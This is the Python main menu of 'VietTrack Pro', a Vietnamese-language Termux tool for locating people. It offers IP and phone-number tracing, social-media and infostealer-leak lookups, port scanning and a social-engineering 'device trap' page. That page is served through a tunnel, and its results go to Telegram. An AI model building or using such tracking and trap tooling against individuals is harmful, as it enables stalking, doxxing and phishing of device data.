"""
VietTrack Pro — Entry point và menu chính.
Framework tình báo vị trí trên Termux (không root).
"""
from __future__ import annotations

import json
import logging
import os
import sys
from datetime import datetime
from pathlib import Path

from colorama import Fore, Style, init as colorama_init
from tabulate import tabulate

from modules import (
    device_trap,
    geo_reverse,
    ip_tracker,
    phone_tracker,
    port_scanner,
    report_gen,
    social_lookup,
)

colorama_init(autoreset=True)

ROOT = Path(__file__).resolve().parent
CONFIG_DIR = ROOT / "config"
OUTPUT_DIR = ROOT / "output"
OUTPUT_DIR.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(ROOT / "viettrack.log", encoding="utf-8"),
        logging.StreamHandler(sys.stdout),
    ],
)
logger = logging.getLogger("viettrack")


def clear() -> None:
    """Xóa màn hình."""
    os.system("clear" if os.name != "nt" else "cls")


def banner() -> None:
    """In banner."""
    art = r"""
 __     ___      _  _____            _      ____
 \ \   / (_) ___| ||_   _| __ __ _  | | __ |  _ \ _ __ ___
  \ \ / /| |/ _ \ __|| || '__/ _` | | |/ / | |_) | '__/ _ \
   \ V / | |  __/ |_ | || | | (_| | |   <  |  __/| | | (_) |
    \_/  |_|\___|\__||_||_|  \__,_| |_|\_\ |_|   |_|  \___/
"""
    print(Fore.CYAN + art)
    print(Fore.YELLOW + "        VietTrack Pro — Tình báo vị trí đa nền tảng")
    print(Fore.MAGENTA + f"        Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(Fore.WHITE + "=" * 60)


def load_json(path: Path) -> dict:
    """Đọc file JSON, trả về dict rỗng nếu không có."""
    if not path.exists():
        return {}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except (ValueError, OSError) as exc:
        logger.warning("Đọc %s lỗi: %s", path, exc)
        return {}


def load_api_keys() -> dict:
    """Đọc API keys."""
    return load_json(CONFIG_DIR / "api_keys.json")


def load_telegram() -> dict:
    """Đọc cấu hình Telegram."""
    return load_json(CONFIG_DIR / "telegram.json")


def load_countries() -> dict:
    """Đọc danh sách quốc gia."""
    return load_json(CONFIG_DIR / "countries.json")


def menu() -> str:
    """In menu, trả về lựa chọn."""
    print(Fore.GREEN + "\n╔══════════════════════════════════════════════════╗")
    print(Fore.GREEN + "║           VIETTRACK PRO — MENU CHÍNH             ║")
    print(Fore.GREEN + "╠══════════════════════════════════════════════════╣")
    items = [
        ("1", "Truy vết địa chỉ IP"),
        ("2", "Truy vết số điện thoại"),
        ("3", "Tìm kiếm qua mạng xã hội"),
        ("4", "Trang bẫy thiết bị (Social Engineering)"),
        ("5", "Chuyển đổi tọa độ ↔ địa chỉ"),
        ("6", "Quét cổng"),
        ("7", "Xuất báo cáo"),
        ("8", "Cài đặt API Keys & Telegram"),
        ("9", "Danh sách quốc gia hỗ trợ"),
        ("0", "Thoát"),
    ]
    for key, label in items:
        print(Fore.GREEN + f"║ [{key}] {label:<44} ║")
    print(Fore.GREEN + "╚══════════════════════════════════════════════════╝")
    return input(Fore.YELLOW + "Chọn: " + Style.RESET_ALL).strip()


def show_table(data: dict, title: str = "") -> None:
    """In dict dạng bảng đẹp."""
    if title:
        print(Fore.CYAN + f"\n=== {title} ===")
    rows = []
    for k, v in data.items():
        if isinstance(v, (dict, list)):
            v = json.dumps(v, ensure_ascii=False)
        rows.append([k, v])
    print(tabulate(rows, headers=["Trường", "Giá trị"], tablefmt="fancy_grid"))


def handle_ip() -> None:
    """Xử lý menu 1."""
    ip = input(Fore.YELLOW + "Nhập IP: " + Style.RESET_ALL).strip()
    if not ip:
        return
    api_keys = load_api_keys()
    print(Fore.CYAN + "\n[*] Đang truy vấn đa nguồn...")
    info = ip_tracker.get_ip_info(ip, api_keys)
    show_table(info, "Thông tin IP")

    if info.get("vi_do") and info.get("kinh_do"):
        print(Fore.CYAN + "\n[*] Reverse geocoding...")
        geo = ip_tracker.reverse_geocode(info["vi_do"], info["kinh_do"])
        show_table(geo, "Địa chỉ ước tính")

        map_file = OUTPUT_DIR / f"map_{ip.replace('.', '_')}.html"
        ip_tracker.create_map(info["vi_do"], info["kinh_do"], str(map_file),
                              popup=f"{ip} - {info.get('thanh_pho')}")
        print(Fore.GREEN + f"[+] Bản đồ: {map_file}")

    print(Fore.CYAN + "\n[*] Quét cổng phổ biến...")
    ports = port_scanner.scan_ports(ip)
    show_table(
        {"ip": ports["ip"], "so_cong_mo": ports["so_cong_mo"]},
        "Tổng quan cổng",
    )
    opened = [r for r in ports["chi_tiet"] if r["trang_thai"] == "mở"]
    if opened:
        print(tabulate(
            [[r["cong"], r["dich_vu"], r["banner"][:60]] for r in opened],
            headers=["Cổng", "Dịch vụ", "Banner"],
            tablefmt="fancy_grid",
        ))

    if api_keys.get("shodan"):
        print(Fore.CYAN + "\n[*] Shodan lookup...")
        sh = ip_tracker.shodan_lookup(ip, api_keys["shodan"])
        show_table(sh, "Shodan")

    out = OUTPUT_DIR / f"ip_{ip.replace('.', '_')}_{datetime.now():%Y%m%d_%H%M%S}.json"
    out.write_text(json.dumps({**info, "geo": geo if info.get("vi_do") else {}, "ports": ports}, ensure_ascii=False, indent=2), encoding="utf-8")
    print(Fore.GREEN + f"\n[+] Đã lưu: {out}")


def handle_phone() -> None:
    """Xử lý menu 2."""
    phone = input(Fore.YELLOW + "Nhập số (VD +84912345678): " + Style.RESET_ALL).strip()
    cc = input(Fore.YELLOW + "Mã quốc gia mặc định [VN]: " + Style.RESET_ALL).strip() or "VN"
    if not phone:
        return
    api_keys = load_api_keys()
    print(Fore.CYAN + "\n[*] Đang tra cứu...")
    info = phone_tracker.get_phone_info(phone, cc, api_keys)
    show_table(info, "Thông tin số điện thoại")

    out = OUTPUT_DIR / f"phone_{phone.lstrip('+')}_{datetime.now():%Y%m%d_%H%M%S}.json"
    out.write_text(json.dumps(info, ensure_ascii=False, indent=2), encoding="utf-8")
    print(Fore.GREEN + f"\n[+] Đã lưu: {out}")


def handle_social() -> None:
    """Xử lý menu 3."""
    phone = input(Fore.YELLOW + "Nhập số: " + Style.RESET_ALL).strip()
    if not phone:
        return
    api_keys = load_api_keys()
    print(Fore.CYAN + "\n[*] Kiểm tra nền tảng...")
    res = social_lookup.check_social(phone)
    print(tabulate(
        [[r["nen_tang"], "✓" if r.get("ton_tai") else "✗", r["url"]] for r in res["ket_qua"]],
        headers=["Nền tảng", "Tồn tại", "URL"],
        tablefmt="fancy_grid",
    ))
    print(Fore.GREEN + f"\n[+] Tổng tài khoản tìm thấy: {res['tong_ton_tai']}")

    print(Fore.CYAN + "\n[*] Hudson Rock (infostealer)...")
    hr = social_lookup.check_hudson_rock(phone)
    show_table({"bi_nhiem": hr.get("bi_nhiem"), "chi_tiet": hr.get("du_lieu")}, "Hudson Rock")

    if api_keys.get("serpapi"):
        print(Fore.CYAN + "\n[*] Google search...")
        for r in social_lookup.search_google(phone, api_keys["serpapi"])[:10]:
            print(Fore.WHITE + f"• {r.get('tieu_de')}\n  {r.get('link')}")

    out = OUTPUT_DIR / f"social_{phone.lstrip('+')}_{datetime.now():%Y%m%d_%H%M%S}.json"
    out.write_text(json.dumps(res, ensure_ascii=False, indent=2), encoding="utf-8")
    print(Fore.GREEN + f"\n[+] Đã lưu: {out}")


def handle_trap() -> None:
    """Xử lý menu 4."""
    print(Fore.YELLOW + "\n[!] Trang bẫy sẽ chạy HTTP server trên máy này.")
    port = input(Fore.YELLOW + "Cổng [8080]: " + Style.RESET_ALL).strip() or "8080"
    tg = load_telegram()
    use_tunnel = input(Fore.YELLOW + "Dùng cloudflared tunnel? (y/n) [y]: " + Style.RESET_ALL).strip().lower() != "n"
    try:
        device_trap.start_trap(
            port=int(port),
            output_dir=str(OUTPUT_DIR),
            telegram_token=tg.get("bot_token", ""),
            chat_id=tg.get("chat_id", ""),
            use_tunnel=use_tunnel,
        )
    except KeyboardInterrupt:
        print(Fore.GREEN + "\n[+] Đã dừng trang bẫy.")


def handle_geo() -> None:
    """Xử lý menu 5."""
    print(Fore.CYAN + "\n[1] Tọa độ → địa chỉ")
    print(Fore.CYAN + "[2] Địa chỉ → tọa độ")
    choice = input(Fore.YELLOW + "Chọn: " + Style.RESET_ALL).strip()

    if choice == "1":
        lat = float(input("Vĩ độ: ").strip())
        lon = float(input("Kinh độ: ").strip())
        res = geo_reverse.reverse_geocode(lat, lon)
        show_table(res, "Địa chỉ")
    elif choice == "2":
        addr = input("Địa chỉ: ").strip()
        res = geo_reverse.forward_geocode(addr)
        if res:
            print(tabulate(
                [[r.get("vi_do"), r.get("kinh_do"), r.get("dia_chi_day_du")] for r in res],
                headers=["Vĩ độ", "Kinh độ", "Địa chỉ"],
                tablefmt="fancy_grid",
            ))


def handle_scan() -> None:
    """Xử lý menu 6."""
    ip = input(Fore.YELLOW + "Nhập IP: " + Style.RESET_ALL).strip()
    ports_input = input(Fore.YELLOW + "Cổng (mặc định phổ biến, cách nhau bằng dấu phẩy): " + Style.RESET_ALL).strip()
    ports = None
    if ports_input:
        try:
            ports = [int(p.strip()) for p in ports_input.split(",") if p.strip()]
        except ValueError:
            print(Fore.RED + "[!] Định dạng cổng không hợp lệ, dùng mặc định.")
    res = port_scanner.scan_ports(ip, ports)
    show_table({"ip": res["ip"], "so_cong_mo": res["so_cong_mo"]}, "Tổng quan")
    print(tabulate(
        [[r["cong"], r["dich_vu"], r["trang_thai"], r["banner"][:60]] for r in res["chi_tiet"]],
        headers=["Cổng", "Dịch vụ", "Trạng thái", "Banner"],
        tablefmt="fancy_grid",
    ))


def handle_report() -> None:
    """Xử lý menu 7."""
    print(Fore.CYAN + "Định dạng: [1] json  [2] csv  [3] txt  [4] html")
    fmt_map = {"1": "json", "2": "csv", "3": "txt", "4": "html"}
    fmt = fmt_map.get(input(Fore.YELLOW + "Chọn: " + Style.RESET_ALL).strip(), "json")
    file_in = input(Fore.YELLOW + "File JSON dữ liệu (trong output/): " + Style.RESET_ALL).strip()
    path = OUTPUT_DIR / file_in
    if not path.exists():
        print(Fore.RED + f"[!] Không tìm thấy: {path}")
        return
    data = json.loads(path.read_text(encoding="utf-8"))
    out = report_gen.generate_report(data, fmt, str(OUTPUT_DIR))
    print(Fore.GREEN + f"[+] Báo cáo: {out}")


def handle_settings() -> None:
    """Xử lý menu 8."""
    print(Fore.CYAN + "\n=== Cài đặt API Keys ===")
    keys = load_api_keys()
    fields = ["numverify", "abstractapi", "ipgeolocation", "ipinfo", "serpapi", "shodan"]
    for k in fields:
        cur = keys.get(k, "")
        masked = ("*" * 8 + cur[-4:]) if len(cur) > 4 else "(trống)"
        val = input(f"{k} [{masked}]: ").strip()
        if val:
            keys[k] = val
    (CONFIG_DIR / "api_keys.json").write_text(json.dumps(keys, ensure_ascii=False, indent=2), encoding="utf-8")

    print(Fore.CYAN + "\n=== Cài đặt Telegram ===")
    tg = load_telegram()
    for k in ("bot_token", "chat_id"):
        val = input(f"{k} [{tg.get(k, '')}]: ").strip()
        if val:
            tg[k] = val
    (CONFIG_DIR / "telegram.json").write_text(json.dumps(tg, ensure_ascii=False, indent=2), encoding="utf-8")

    print(Fore.GREEN + "[+] Đã lưu cấu hình.")


def handle_countries() -> None:
    """Xử lý menu 9."""
    countries = load_countries()
    rows = [[code, c["name"], c["code"], ", ".join(c["carriers"])] for code, c in countries.items()]
    print(tabulate(rows, headers=["Mã", "Quốc gia", "Đầu số", "Nhà mạng"], tablefmt="fancy_grid"))
    print(Fore.GREEN + f"\n[+] Tổng: {len(countries)} quốc gia")


def main() -> None:
    """Vòng lặp chính."""
    actions = {
        "1": handle_ip,
        "2": handle_phone,
        "3": handle_social,
        "4": handle_trap,
        "5": handle_geo,
        "6": handle_scan,
        "7": handle_report,
        "8": handle_settings,
        "9": handle_countries,
    }

    while True:
        clear()
        banner()
        choice = menu()
        if choice == "0":
            print(Fore.YELLOW + "\n[+] Tạm biệt, LO.")
            return
        handler = actions.get(choice)
        if not handler:
            print(Fore.RED + "[!] Lựa chọn không hợp lệ.")
            input(Fore.WHITE + "Enter để tiếp tục...")
            continue
        try:
            handler()
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Đã hủy.")
        except Exception as exc:
            logger.exception("Lỗi xử lý: %s", exc)
            print(Fore.RED + f"[!] Lỗi: {exc}")
        input(Fore.WHITE + "\nEnter để tiếp tục...")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[+] Thoát.")
